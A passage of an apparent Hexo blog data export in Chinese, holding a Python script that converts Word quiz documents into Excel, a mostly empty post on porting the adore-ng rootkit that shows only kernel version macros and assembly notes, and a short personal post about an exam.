class=\"string\">'problemno'</span>] = i</div><div class=\"line\">        <span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> colname:</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                worksheet.cell(row=i, column=j, value=col[name])</div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                <span class=\"keyword\">print</span> col[<span class=\"string\">'problemno'</span>], name, col[name]</div><div class=\"line\">                exit()</div><div class=\"line\">            j += <span class=\"number\">1</span></div><div class=\"line\">        i += <span class=\"number\">1</span></div><div class=\"line\">    workbook.save(<span class=\"string\">'&#123;&#125;'</span>.format(filename))</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    path, filename = os.path.split(sys.argv[<span class=\"number\">1</span>])[<span class=\"number\">0</span>], os.path.split(sys.argv[<span class=\"number\">1</span>])[<span class=\"number\">1</span>]</div><div class=\"line\">    suffix = filename.split(<span class=\"string\">'.'</span>)[<span class=\"number\">1</span>]</div><div class=\"line\">    <span class=\"keyword\">if</span> suffix == <span class=\"string\">'doc'</span>:</div><div class=\"line\">        newfilename = doc2docx(path, filename)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        newfilename = filename</div><div class=\"line\"></div><div class=\"line\">    data = wordparse(path=path, docname=newfilename)</div><div class=\"line\">    write2xlsx(sys.argv[<span class=\"number\">2</span>], data)</div></pre></td></tr></table></figure></p>\n","excerpt":"<p>这破玩意因为编码问题坑了我看好久，还有就是dict的深浅拷贝的问题。</p>","more":"<figure class=\"highlight elm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys, os</div><div class=\"line\"><span class=\"keyword\">import</span> docx</div><div class=\"line\"><span class=\"keyword\">import</span> openpyxl</div><div class=\"line\"><span class=\"keyword\">import</span> chardet           # 检测编码格式用的，蛮好用</div><div class=\"line\"><span class=\"keyword\">import</span> re                     # 我的没用到很多</div><div class=\"line\"><span class=\"title\">from</span> win32com <span class=\"keyword\">import</span> client <span class=\"keyword\">as</span> wc                # 处理doc转docx</div></pre></td></tr></table></figure>\n<p>python处理doc的包<br><code>pip install python-docx</code><br>pthon处理excel的包<br><code>pip install openpyxl</code></p>\n<p>在使用python-docx的包必须要将doc转换成docx，用<code>win32com</code>即可，这个包属于<code>pypiwin32</code><br>安装方式<code>pip install pypiwin32</code></p>\n<p>使用的时候不知道为什么<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">import win32com</div><div class=\"line\">word = win32com<span class=\"selector-class\">.client</span><span class=\"selector-class\">.Dispatch</span>(<span class=\"string\">'Word.Application'</span>)</div></pre></td></tr></table></figure></p>\n<p>会报错<code>client</code>找不到</p>\n<p>只能够使用<code>from win32com import client as wc</code>的方式处理</p>\n<p>下面的代码将doc转换成docx<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">doc2docx</span><span class=\"params\">(path, docname)</span>:</span></div><div class=\"line\">    word = wc.Dispatch(<span class=\"string\">'Word.Application'</span>)</div><div class=\"line\">    doc = word.Documents.Open(<span class=\"string\">ur'&#123;&#125;'</span>.format(os.path.join(path, docname)))</div><div class=\"line\">    newfilename = os.path.join(path, docname.split(<span class=\"string\">'.'</span>)[<span class=\"number\">0</span>] + <span class=\"string\">'.docx'</span>)</div><div class=\"line\">    doc.SaveAs(<span class=\"string\">ur'&#123;&#125;'</span>.format(newfilename), <span class=\"number\">16</span>)                  <span class=\"comment\">#16表示保存额为docx</span></div><div class=\"line\">    doc.Close()</div><div class=\"line\">    word.Quit()</div><div class=\"line\">    <span class=\"keyword\">return</span> newfilename</div></pre></td></tr></table></figure></p>\n<p>关于字典的深浅拷贝，直接应用别人的一段代码来说明<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></div><div class=\"line\"> </div><div class=\"line\">dict1 =  &#123;<span class=\"string\">'user'</span>:<span class=\"string\">'runoob'</span>,<span class=\"string\">'num'</span>:[1,2,3]&#125;</div><div class=\"line\"> </div><div class=\"line\">dict2 = dict1          <span class=\"comment\"># 浅拷贝: 引用对象</span></div><div class=\"line\">dict3 = dict1.copy()   <span class=\"comment\"># 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"comment\"># 修改 data 数据</span></div><div class=\"line\">dict1[<span class=\"string\">'user'</span>]=<span class=\"string\">'root'</span></div><div class=\"line\">dict1[<span class=\"string\">'num'</span>].remove(1)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"comment\"># 输出结果</span></div><div class=\"line\"><span class=\"built_in\">print</span>(dict1)</div><div class=\"line\"><span class=\"built_in\">print</span>(dict2)</div><div class=\"line\"><span class=\"built_in\">print</span>(dict3)</div></pre></td></tr></table></figure></p>\n<p>全部代码，虽然只有90行，但是查了我不少资料，果然我python基本功还是不行。。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> sys, os</div><div class=\"line\"><span class=\"keyword\">import</span> docx</div><div class=\"line\"><span class=\"keyword\">import</span> openpyxl</div><div class=\"line\"><span class=\"keyword\">import</span> chardet</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">from</span> win32com <span class=\"keyword\">import</span> client <span class=\"keyword\">as</span> wc</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">doc2docx</span><span class=\"params\">(path, docname)</span>:</span></div><div class=\"line\">    word = wc.Dispatch(<span class=\"string\">'Word.Application'</span>)</div><div class=\"line\">    doc = word.Documents.Open(<span class=\"string\">ur'&#123;&#125;'</span>.format(os.path.join(path, docname)))</div><div class=\"line\">    newfilename = os.path.join(path, docname.split(<span class=\"string\">'.'</span>)[<span class=\"number\">0</span>] + <span class=\"string\">'.docx'</span>)</div><div class=\"line\">    doc.SaveAs(<span class=\"string\">ur'&#123;&#125;'</span>.format(newfilename), <span class=\"number\">16</span>)</div><div class=\"line\">    doc.Close()</div><div class=\"line\">    word.Quit()</div><div class=\"line\">    <span class=\"keyword\">return</span> newfilename</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wordparse</span><span class=\"params\">(path, docname)</span>:</span></div><div class=\"line\">    document = docx.Document(<span class=\"string\">ur'&#123;&#125;'</span>.format(os.path.join(path, docname)))</div><div class=\"line\">    lines = [paragraph.text.encode(<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">for</span> paragraph <span class=\"keyword\">in</span> document.paragraphs ]</div><div class=\"line\">    <span class=\"comment\"># 图书编号\t书名\t试题编号\t测试题题干\t选项1\t选项2\t选项3\t选项4\t选项5\t答案\t选项数量</span></div><div class=\"line\">    col = &#123;<span class=\"string\">'bookno'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'bookname'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'problemno'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'problemcontent'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'chose1'</span>: <span class=\"keyword\">None</span>,</div><div class=\"line\">           <span class=\"string\">'chose2'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'chose3'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'chose4'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'answer'</span>: <span class=\"keyword\">None</span>, <span class=\"string\">'answercount'</span>: <span class=\"number\">4</span>&#125;</div><div class=\"line\">    result = []</div><div class=\"line\">    groupproblem = []</div><div class=\"line\">    tmpresult = []</div><div class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines:</div><div class=\"line\">        <span class=\"keyword\">if</span> re.match(<span class=\"string\">r'^\\d'</span>, line):</div><div class=\"line\">            <span class=\"keyword\">if</span> groupproblem != []:</div><div class=\"line\">                tmpresult.append(groupproblem)</div><div class=\"line\">                groupproblem = []</div><div class=\"line\">                groupproblem.append(line)</div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                groupproblem.append(line)</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"keyword\">if</span> line != <span class=\"string\">''</span>:</div><div class=\"line\">                groupproblem.append(line)</div><div class=\"line\">    <span class=\"keyword\">for</span> tmpproblem <span class=\"keyword\">in</span> tmpresult:</div><div class=\"line\">        tmpstr = <span class=\"string\">''</span></div><div class=\"line\">        tmpcol = col.copy()</div><div class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> tmpproblem:</div><div class=\"line\">            tmpstr += line</div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            content = tmpstr.find(<span class=\"string\">'、'</span>)</div><div class=\"line\">            k1 = tmpstr.find(<span class=\"string\">'（'</span>)</div><div class=\"line\">            k2 = tmpstr.find(<span class=\"string\">'）'</span>)</div><div class=\"line\">            A = tmpstr.find(<span class=\"string\">'A'</span>, k2)</div><div class=\"line\">            B = tmpstr.find(<span class=\"string\">'B'</span>, k2)</div><div class=\"line\">            C = tmpstr.find(<span class=\"string\">'C'</span>, k2)</div><div class=\"line\">            D = tmpstr.find(<span class=\"string\">'D'</span>, k2)</div><div class=\"line\">            tmpcol[<span class=\"string\">'bookno'</span>] = <span class=\"string\">'B1-xiaoxue'</span></div><div class=\"line\">            tmpcol[<span class=\"string\">'bookname'</span>] = <span class=\"string\">'《传播网络正能量（小学版）》'</span></div><div class=\"line\">            tmpcol[<span class=\"string\">'problemno'</span>] = tmpstr[:content]</div><div class=\"line\">            tmpcol[<span class=\"string\">'problemcontent'</span>] = tmpstr[content+<span class=\"number\">3</span>:k1] + <span class=\"string\">'____'</span> + tmpstr[k2+<span class=\"number\">3</span>:A]</div><div class=\"line\">            tmpcol[<span class=\"string\">'chose1'</span>], tmpcol[<span class=\"string\">'chose2'</span>], tmpcol[<span class=\"string\">'chose3'</span>], tmpcol[<span class=\"string\">'chose4'</span>] = tmpstr[A:B], tmpstr[B:C], tmpstr[C:D], tmpstr[D:]</div><div class=\"line\">            tmpcol[<span class=\"string\">'answer'</span>] = tmpstr[k1+<span class=\"number\">3</span>:k2]</div><div class=\"line\">            result.append(tmpcol)</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            <span class=\"keyword\">print</span> tmpstr</div><div class=\"line\">            exit()</div><div class=\"line\">    <span class=\"keyword\">return</span> result</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write2xlsx</span><span class=\"params\">(filename, data)</span>:</span></div><div class=\"line\">    workbook = openpyxl.Workbook()</div><div class=\"line\">    worksheet = workbook.create_sheet(<span class=\"string\">'problem'</span>, <span class=\"number\">0</span>)</div><div class=\"line\">    colname = [<span class=\"string\">'bookno'</span>, <span class=\"string\">'bookname'</span>, <span class=\"string\">'problemno'</span>, <span class=\"string\">'problemcontent'</span>, <span class=\"string\">'chose1'</span>,</div><div class=\"line\">           <span class=\"string\">'chose2'</span>, <span class=\"string\">'chose3'</span>, <span class=\"string\">'chose4'</span>, <span class=\"string\">'answer'</span>, <span class=\"string\">'answercount'</span>]</div><div class=\"line\">    i, j = <span class=\"number\">1</span>, <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> data:</div><div class=\"line\">        j = <span class=\"number\">1</span></div><div class=\"line\">        col[<span class=\"string\">'problemno'</span>] = i</div><div class=\"line\">        <span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> colname:</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                worksheet.cell(row=i, column=j, value=col[name])</div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                <span class=\"keyword\">print</span> col[<span class=\"string\">'problemno'</span>], name, col[name]</div><div class=\"line\">                exit()</div><div class=\"line\">            j += <span class=\"number\">1</span></div><div class=\"line\">        i += <span class=\"number\">1</span></div><div class=\"line\">    workbook.save(<span class=\"string\">'&#123;&#125;'</span>.format(filename))</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    path, filename = os.path.split(sys.argv[<span class=\"number\">1</span>])[<span class=\"number\">0</span>], os.path.split(sys.argv[<span class=\"number\">1</span>])[<span class=\"number\">1</span>]</div><div class=\"line\">    suffix = filename.split(<span class=\"string\">'.'</span>)[<span class=\"number\">1</span>]</div><div class=\"line\">    <span class=\"keyword\">if</span> suffix == <span class=\"string\">'doc'</span>:</div><div class=\"line\">        newfilename = doc2docx(path, filename)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        newfilename = filename</div><div class=\"line\"></div><div class=\"line\">    data = wordparse(path=path, docname=newfilename)</div><div class=\"line\">    write2xlsx(sys.argv[<span class=\"number\">2</span>], data)</div></pre></td></tr></table></figure></p>"},{"title":"一款rootkit分析","date":"2017-07-31T08:33:18.000Z","_content":"\n## Makefile\n\n## LKM学习\n\n## adore-ng分析\n\n## adore-ng从2.6内核升级为3.0内核\n\n在内核升级的过程中遇到了一些问题，导致我耽误了很久在这个事情上。\n\n### 内核的版本问题\n\n在`#include <linux/version.h>`中存在关于内核的版本的定义\n```\n#define LINUX_VERSION_CODE 199182\n#define KERNEL_VERSION(a,b,c) (((a)<< 16) + ((b)<< 8) + (c))\n```\n\n在使用时只要在预编译处定义即可\n```\n#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))\n#else\n#endif\n```\n\n### C中的内联函数\n\n耐着性子看完了。。\n[汇编语言---GCC内联汇编](http://www.cnblogs.com/taek/archive/2012/02/05/2338838.html)\n\n并且在64位的机器上写汇编指令一定要精确操作符的位\n\n[C uses assemble: operand type mismatch for push](https://stackoverflow.com/questions/21245245/c-uses-assemble-operand-type-mismatch-for-push)\n\n| 后缀 | cpu位数 | 寄存器 |\n| :-------------: | :-----------------------: |\n| q | 64 | rax |\n| l | 32 | eax |\n| w | 16 | ax |\n\n关于`static inline`和`extend inline`的区别什么的。。。\n\n### 一些宏定义\n\n由于CVE-2009-2009的漏洞（具体没看，大概是寄存器高地址的UAF造成的提权）的原因，3.6版本内核及以下的`sock_map_fd`等函数到3.7以后都用`SYSCALL_DEFINE3`的宏来定义，接口全部变为`sys_socket()`了。","source":"_posts/一款rootkit分析.md","raw":"---\ntitle: 一款rootkit分析\ntags:\n  - rookit\n  - Linux内核\ncategories: []\ndate: 2017-07-31 16:33:18\n---\n\n## Makefile\n\n## LKM学习\n\n## adore-ng分析\n\n## adore-ng从2.6内核升级为3.0内核\n\n在内核升级的过程中遇到了一些问题，导致我耽误了很久在这个事情上。\n\n### 内核的版本问题\n\n在`#include <linux/version.h>`中存在关于内核的版本的定义\n```\n#define LINUX_VERSION_CODE 199182\n#define KERNEL_VERSION(a,b,c) (((a)<< 16) + ((b)<< 8) + (c))\n```\n\n在使用时只要在预编译处定义即可\n```\n#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))\n#else\n#endif\n```\n\n### C中的内联函数\n\n耐着性子看完了。。\n[汇编语言---GCC内联汇编](http://www.cnblogs.com/taek/archive/2012/02/05/2338838.html)\n\n并且在64位的机器上写汇编指令一定要精确操作符的位\n\n[C uses assemble: operand type mismatch for push](https://stackoverflow.com/questions/21245245/c-uses-assemble-operand-type-mismatch-for-push)\n\n| 后缀 | cpu位数 | 寄存器 |\n| :-------------: | :-----------------------: |\n| q | 64 | rax |\n| l | 32 | eax |\n| w | 16 | ax |\n\n关于`static inline`和`extend inline`的区别什么的。。。\n\n### 一些宏定义\n\n由于CVE-2009-2009的漏洞（具体没看，大概是寄存器高地址的UAF造成的提权）的原因，3.6版本内核及以下的`sock_map_fd`等函数到3.7以后都用`SYSCALL_DEFINE3`的宏来定义，接口全部变为`sys_socket()`了。","slug":"一款rootkit分析","published":1,"updated":"2017-08-07T09:39:35.091Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k45004qhv183jtq8hqt","content":"<h2 id=\"Makefile\"><a href=\"#Makefile\" class=\"headerlink\" title=\"Makefile\"></a>Makefile</h2><h2 id=\"LKM学习\"><a href=\"#LKM学习\" class=\"headerlink\" title=\"LKM学习\"></a>LKM学习</h2><h2 id=\"adore-ng分析\"><a href=\"#adore-ng分析\" class=\"headerlink\" title=\"adore-ng分析\"></a>adore-ng分析</h2><h2 id=\"adore-ng从2-6内核升级为3-0内核\"><a href=\"#adore-ng从2-6内核升级为3-0内核\" class=\"headerlink\" title=\"adore-ng从2.6内核升级为3.0内核\"></a>adore-ng从2.6内核升级为3.0内核</h2><p>在内核升级的过程中遇到了一些问题，导致我耽误了很久在这个事情上。</p>\n<h3 id=\"内核的版本问题\"><a href=\"#内核的版本问题\" class=\"headerlink\" title=\"内核的版本问题\"></a>内核的版本问题</h3><p>在<code>#include &lt;linux/version.h&gt;</code>中存在关于内核的版本的定义<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">#define LINUX_VERSION_CODE <span class=\"number\">199182</span></div><div class=\"line\">#define KERNEL_VERSION(<span class=\"name\">a</span>,b,c) (((<span class=\"name\">a</span>)&lt;&lt; <span class=\"number\">16</span>) + ((<span class=\"name\">b</span>)&lt;&lt; <span class=\"number\">8</span>) + (<span class=\"name\">c</span>))</div></pre></td></tr></table></figure></p>\n<p>在使用时只要在预编译处定义即可<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(3, 11, 0))</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div></pre></td></tr></table></figure></p>\n<h3 id=\"C中的内联函数\"><a href=\"#C中的内联函数\" class=\"headerlink\" title=\"C中的内联函数\"></a>C中的内联函数</h3><p>耐着性子看完了。。<br><a href=\"http://www.cnblogs.com/taek/archive/2012/02/05/2338838.html\" target=\"_blank\" rel=\"external\">汇编语言—GCC内联汇编</a></p>\n<p>并且在64位的机器上写汇编指令一定要精确操作符的位</p>\n<p><a href=\"https://stackoverflow.com/questions/21245245/c-uses-assemble-operand-type-mismatch-for-push\" target=\"_blank\" rel=\"external\">C uses assemble: operand type mismatch for push</a></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">后缀</th>\n<th style=\"text-align:center\">cpu位数</th>\n<th>寄存器</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">q</td>\n<td style=\"text-align:center\">64</td>\n<td>rax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">l</td>\n<td style=\"text-align:center\">32</td>\n<td>eax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">w</td>\n<td style=\"text-align:center\">16</td>\n<td>ax</td>\n</tr>\n</tbody>\n</table>\n<p>关于<code>static inline</code>和<code>extend inline</code>的区别什么的。。。</p>\n<h3 id=\"一些宏定义\"><a href=\"#一些宏定义\" class=\"headerlink\" title=\"一些宏定义\"></a>一些宏定义</h3><p>由于CVE-2009-2009的漏洞（具体没看，大概是寄存器高地址的UAF造成的提权）的原因，3.6版本内核及以下的<code>sock_map_fd</code>等函数到3.7以后都用<code>SYSCALL_DEFINE3</code>的宏来定义，接口全部变为<code>sys_socket()</code>了。</p>\n","excerpt":"","more":"<h2 id=\"Makefile\"><a href=\"#Makefile\" class=\"headerlink\" title=\"Makefile\"></a>Makefile</h2><h2 id=\"LKM学习\"><a href=\"#LKM学习\" class=\"headerlink\" title=\"LKM学习\"></a>LKM学习</h2><h2 id=\"adore-ng分析\"><a href=\"#adore-ng分析\" class=\"headerlink\" title=\"adore-ng分析\"></a>adore-ng分析</h2><h2 id=\"adore-ng从2-6内核升级为3-0内核\"><a href=\"#adore-ng从2-6内核升级为3-0内核\" class=\"headerlink\" title=\"adore-ng从2.6内核升级为3.0内核\"></a>adore-ng从2.6内核升级为3.0内核</h2><p>在内核升级的过程中遇到了一些问题，导致我耽误了很久在这个事情上。</p>\n<h3 id=\"内核的版本问题\"><a href=\"#内核的版本问题\" class=\"headerlink\" title=\"内核的版本问题\"></a>内核的版本问题</h3><p>在<code>#include &lt;linux/version.h&gt;</code>中存在关于内核的版本的定义<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">#define LINUX_VERSION_CODE <span class=\"number\">199182</span></div><div class=\"line\">#define KERNEL_VERSION(<span class=\"name\">a</span>,b,c) (((<span class=\"name\">a</span>)&lt;&lt; <span class=\"number\">16</span>) + ((<span class=\"name\">b</span>)&lt;&lt; <span class=\"number\">8</span>) + (<span class=\"name\">c</span>))</div></pre></td></tr></table></figure></p>\n<p>在使用时只要在预编译处定义即可<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(3, 11, 0))</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div></pre></td></tr></table></figure></p>\n<h3 id=\"C中的内联函数\"><a href=\"#C中的内联函数\" class=\"headerlink\" title=\"C中的内联函数\"></a>C中的内联函数</h3><p>耐着性子看完了。。<br><a href=\"http://www.cnblogs.com/taek/archive/2012/02/05/2338838.html\">汇编语言—GCC内联汇编</a></p>\n<p>并且在64位的机器上写汇编指令一定要精确操作符的位</p>\n<p><a href=\"https://stackoverflow.com/questions/21245245/c-uses-assemble-operand-type-mismatch-for-push\">C uses assemble: operand type mismatch for push</a></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">后缀</th>\n<th style=\"text-align:center\">cpu位数</th>\n<th>寄存器</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">q</td>\n<td style=\"text-align:center\">64</td>\n<td>rax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">l</td>\n<td style=\"text-align:center\">32</td>\n<td>eax</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">w</td>\n<td style=\"text-align:center\">16</td>\n<td>ax</td>\n</tr>\n</tbody>\n</table>\n<p>关于<code>static inline</code>和<code>extend inline</code>的区别什么的。。。</p>\n<h3 id=\"一些宏定义\"><a href=\"#一些宏定义\" class=\"headerlink\" title=\"一些宏定义\"></a>一些宏定义</h3><p>由于CVE-2009-2009的漏洞（具体没看，大概是寄存器高地址的UAF造成的提权）的原因，3.6版本内核及以下的<code>sock_map_fd</code>等函数到3.7以后都用<code>SYSCALL_DEFINE3</code>的宏来定义，接口全部变为<code>sys_socket()</code>了。</p>\n"},{"title":"告一段落的","date":"2017-03-05T00:18:57.000Z","_content":"\n昨天考完了PAT，能力不济是其一，没有拿到满分；另外CS的竞争是激烈的，我等非科班出身的应真切的看到自身的处境。不过也正是这样才有趣的吧。\n\n总结下这次PAT的收获吧：\n\n1. 春季考试很可能放水\n2. 永远不要有侥幸心理，因为复习的不考，考的不复习，所以好好准备\n3. 人外有人，天外有天\n4. 人若无名，便可专心练剑。物若无名，便可随意取舍。\n\n下面的任务吧：\n\n1. Machine Learning网课\n2. 线代\n3. XCTF\n4. PAT每日一练\n5. ACM\n6. TOFEL\n\n每日计划完成，感觉自己离梦想又近了一步，反则更远了一步。","source":"_posts/告一段落的.md","raw":"---\ntitle: 告一段落的\ntags:\n  - life\ncategories: []\ndate: 2017-03-05 08:18:57\n---\n\n昨天考完了PAT，能力不济是其一，没有拿到满分；另外CS的竞争是激烈的，我等非科班出身的应真切的看到自身的处境。不过也正是这样才有趣的吧。\n\n总结下这次PAT的收获吧：\n\n1. 春季考试很可能放水\n2. 永远不要有侥幸心理，因为复习的不考，考的不复习，所以好好准备\n3. 人外有人，天外有天\n4. 人若无名，便可专心练剑。物若无名，便可随意取舍。\n\n下面的任务吧：\n\n1. Machine Learning网课\n2. 线代\n3. XCTF\n4. PAT每日一练\n5. ACM\n6. TOFEL\n\n每日计划完成，感觉自己离梦想又近了一步，反则更远了一步。","slug":"告一段落的","published":1,"updated":"2017-03-05T01:07:05.409Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k46004shv18vt50okp3","content":"<p>昨天考完了PAT，能力不济是其一，没有拿到满分；另外CS的竞争是激烈的，我等非科班出身的应真切的看到自身的处境。不过也正是这样才有趣的吧。</p>\n<p>总结下这次PAT的收获吧：</p>\n<ol>\n<li>春季考试很可能放水</li>\n<li>永远不要有侥幸心理，因为复习的不考，考的不复习，所以好好准备</li>\n<li>人外有人，天外有天</li>\n<li>人若无名，便可专心练剑。物若无名，便可随意取舍。</li>\n</ol>\n<p>下面的任务吧：</p>\n<ol>\n<li>Machine 